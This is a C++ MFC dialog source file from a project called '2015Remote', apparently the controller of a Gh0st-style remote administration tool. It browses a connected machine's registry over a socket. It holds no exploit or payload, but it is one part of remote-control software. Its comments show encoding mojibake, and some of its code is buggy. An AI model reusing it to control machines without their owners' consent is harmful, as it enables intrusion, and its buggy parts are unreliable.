// RegisterDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "RegisterDlg.h"
#include "afxdialogex.h"


enum MYKEY{
	MHKEY_CLASSES_ROOT,
	MHKEY_CURRENT_USER,
	MHKEY_LOCAL_MACHINE,
	MHKEY_USERS,
	MHKEY_CURRENT_CONFIG
};
enum KEYVALUE{
	MREG_SZ,
	MREG_DWORD,
	MREG_BINARY,
	MREG_EXPAND_SZ
};

// CRegisterDlg �Ի���

IMPLEMENT_DYNAMIC(CRegisterDlg, CDialog)


CRegisterDlg::CRegisterDlg(CWnd* pParent,IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(CRegisterDlg::IDD, pParent)
{
	m_iocpServer	= IOCPServer;
	m_ContextObject	= ContextObject;
}

CRegisterDlg::~CRegisterDlg()
{
}

void CRegisterDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE, m_Tree);
	DDX_Control(pDX, IDC_LIST, m_ControlList);
}


BEGIN_MESSAGE_MAP(CRegisterDlg, CDialog)
	ON_WM_CLOSE()
	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE, &CRegisterDlg::OnTvnSelchangedTree)
END_MESSAGE_MAP()


// CRegisterDlg ��Ϣ��������


BOOL CRegisterDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ����Ӷ���ĳ�ʼ��

	m_ImageListTree.Create(18, 18, ILC_COLOR16,10, 0);   //���� ���ؼ��ϵ�ͼ��

	m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON_FATHER), IMAGE_ICON, 18, 18, 0);
	m_ImageListTree.Add(m_hIcon);
	m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON_DIR), IMAGE_ICON, 18, 18, 0);
	m_ImageListTree.Add(m_hIcon);

	m_Tree.SetImageList(&m_ImageListTree,TVSIL_NORMAL);

	m_hRoot = m_Tree.InsertItem("ע�������",0,0,0,0);      //0
	HKCU    = m_Tree.InsertItem("HKEY_CURRENT_USER",1,1,m_hRoot,0); //1
	HKLM    = m_Tree.InsertItem("HKEY_LOCAL_MACHINE",1,1,m_hRoot,0);  
	HKUS    = m_Tree.InsertItem("HKEY_USERS",1,1,m_hRoot,0);
	HKCC    = m_Tree.InsertItem("HKEY_CURRENT_CONFIG",1,1,m_hRoot,0);
	HKCR    = m_Tree.InsertItem("HKEY_CLASSES_ROOT",1,1,m_hRoot,0);

	m_Tree.Expand(m_hRoot,TVE_EXPAND);

	m_ControlList.InsertColumn(0,"����",LVCFMT_LEFT,150,-1);   
	m_ControlList.InsertColumn(1,"����",LVCFMT_LEFT,60,-1);
	m_ControlList.InsertColumn(2,"����",LVCFMT_LEFT,300,-1);
	m_ControlList.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	//////����ͼ��//////
	m_ImageListControlList.Create(16,16,TRUE,2,2);
	m_ImageListControlList.Add(AfxGetApp()->LoadIcon(IDI_ICON_STRING));
	m_ImageListControlList.Add(AfxGetApp()->LoadIcon(IDI_ICON_DWORD));
	m_ControlList.SetImageList(&m_ImageListControlList,LVSIL_SMALL);

	m_isEnable = TRUE;   //��ֵ��Ϊ�˽��Ƶ�� �򱻿ض�����   

	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


void CRegisterDlg::OnClose()
{
	// TODO: �ڴ�������Ϣ������������/�����Ĭ��ֵ
	m_ContextObject->v1 = 0;
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);
	CDialog::OnClose();
	delete this;
}


void CRegisterDlg::OnTvnSelchangedTree(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);

	if(!m_isEnable)	
	{
		return;
	}
	m_isEnable=FALSE;;

	TVITEM Item = pNMTreeView->itemNew;

	if(Item.hItem == m_hRoot)
	{
		m_isEnable=TRUE;;
		return;
	}

	m_hSelectedItem=Item.hItem;			//�����û��򿪵������ڵ���   //0  1 2 2 3
	m_ControlList.DeleteAllItems();

	CString strFullPath=GetFullPath(m_hSelectedItem);    //��ü�ֵ·��  

	char bToken=GetFatherPath(strFullPath);       //[2] \1\2\3
	//����һ����
	int nitem=m_ControlList.InsertItem(0,"(Ĭ��)",0);
	m_ControlList.SetItemText(nitem,1,"REG_SZ");	
	m_ControlList.SetItemText(nitem,2,"(����δ����ֵ)");

	strFullPath.Insert(0,bToken);//����  �Ǹ�����
	bToken=COMMAND_REG_FIND;
	strFullPath.Insert(0,bToken);      //�����ѯ����  [COMMAND_REG_FIND][x]

	m_iocpServer->OnClientPreSending(m_ContextObject, (LPBYTE)(strFullPath.GetBuffer(0)), strFullPath.GetLength()+1);

	m_isEnable = TRUE;

	*pResult = 0;
}

CString CRegisterDlg::GetFullPath(HTREEITEM hCurrent)
{
	CString strTemp;
	CString strReturn = "";
	while(1)
	{
		if(hCurrent==m_hRoot)
		{
			return strReturn;
		}
		strTemp = m_Tree.GetItemText(hCurrent);  
		if(strTemp.Right(1) != "\\")
			strTemp += "\\";
		strReturn = strTemp  + strReturn;
		hCurrent = m_Tree.GetParentItem(hCurrent);   //�õ�����

	}
	return strReturn;
}

char CRegisterDlg::GetFatherPath(CString& strFullPath)
{
	char bToken;
	if(!strFullPath.Find("HKEY_CLASSES_ROOT"))	//�ж�����
	{

		bToken=MHKEY_CLASSES_ROOT;
		strFullPath.Delete(0,sizeof("HKEY_CLASSES_ROOT"));
	}else if(!strFullPath.Find("HKEY_CURRENT_USER"))
	{
		bToken=MHKEY_CURRENT_USER;
		strFullPath.Delete(0,sizeof("HKEY_CURRENT_USER"));

	}else if(!strFullPath.Find("HKEY_LOCAL_MACHINE"))
	{
		bToken=MHKEY_LOCAL_MACHINE;
		strFullPath.Delete(0,sizeof("HKEY_LOCAL_MACHINE"));

	}else if(!strFullPath.Find("HKEY_USERS"))
	{
		bToken=MHKEY_USERS;
		strFullPath.Delete(0,sizeof("HKEY_USERS"));

	}else if(!strFullPath.Find("HKEY_CURRENT_CONFIG"))
	{
		bToken=MHKEY_CURRENT_CONFIG;
		strFullPath.Delete(0,sizeof("HKEY_CURRENT_CONFIG"));

	}
	return bToken;
}


void CRegisterDlg::OnReceiveComplete(void)
{
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{

	case TOKEN_REG_PATH:
		{
			AddPath((char*)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1)));
			break;
		}

	case TOKEN_REG_KEY:
		{
			AddKey((char*)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1)));
			break;
		}

	default:
		// ���䷢���쳣����
		break;
	}
}


struct REGMSG{
	int count;         //���ָ���
	DWORD size;             //���ִ�С
	DWORD valsize;     //ֵ��С
};


void CRegisterDlg::AddPath(char* szBuffer)
{
	if(szBuffer==NULL) return;
	int msgsize=sizeof(REGMSG);
	REGMSG msg;
	memcpy((void*)&msg,szBuffer,msgsize);
	DWORD size =msg.size;
	int count=msg.count;

	if(size>0&&count>0){                   //һ�㱣����ʩ
		for(int i=0;i<count;i++){
			char* szKeyName=szBuffer+size*i+msgsize;
			m_Tree.InsertItem(szKeyName,1,1,m_hSelectedItem,0);//�����Ӽ�����
			m_Tree.Expand(m_hSelectedItem,TVE_EXPAND);
		}
	}
}

void CRegisterDlg::AddKey(char* szBuffer)
{
	m_ControlList.DeleteAllItems();
	int iItem=m_ControlList.InsertItem(0,"(Data)",0);
	m_ControlList.SetItemText(iItem,1,"REG_SZ");	
	m_ControlList.SetItemText(iItem,2,"(NULL)");

	if(szBuffer==NULL) return;
	REGMSG msg;
	memcpy((void*)&msg,szBuffer,sizeof(msg));
	char* szTemp=szBuffer+sizeof(msg);  
	for(int i=0;i<msg.count;i++)
	{
		BYTE Type=szTemp[0];   //����
		szTemp+=sizeof(BYTE);
		char* szValueName=szTemp;   //ȡ������
		szTemp+=msg.size;
		BYTE* szValueDate=(BYTE*)szTemp;      //ȡ��ֵ
		szTemp+=msg.valsize;
		if(Type==MREG_SZ)
		{
			int iItem=m_ControlList.InsertItem(0,szValueName,0);
			m_ControlList.SetItemText(iItem,1,"REG_SZ");	
			m_ControlList.SetItemText(iItem,2,(char*)szValueDate);
		}
		if(Type==MREG_DWORD)
		{
			char ValueDate[256];
			DWORD d=(DWORD)szValueDate;
			memcpy((void*)&d,szValueDate,sizeof(DWORD));
			CString strValue;
			strValue.Format("0x%x",d);
			sprintf(ValueDate,"  (%wd)",d);
			strValue+=" ";
			strValue+=ValueDate;
			int iItem=m_ControlList.InsertItem(0,szValueName,1);
			m_ControlList.SetItemText(iItem,1,"REG_DWORD");	
			m_ControlList.SetItemText(iItem,2,strValue);
		}
		if(Type==MREG_BINARY)
		{
			char ValueDate[256];
			sprintf(ValueDate,"%wd",szValueDate);

			int iItem=m_ControlList.InsertItem(0,szValueName,1);
			m_ControlList.SetItemText(iItem,1,"REG_BINARY");	
			m_ControlList.SetItemText(iItem,2,ValueDate);
		}
		if(Type==MREG_EXPAND_SZ)
		{
			int iItem=m_ControlList.InsertItem(0,szValueName,0);
			m_ControlList.SetItemText(iItem,1,"REG_EXPAND_SZ");	
			m_ControlList.SetItemText(iItem,2,(char*)szValueDate);
		}
	}
}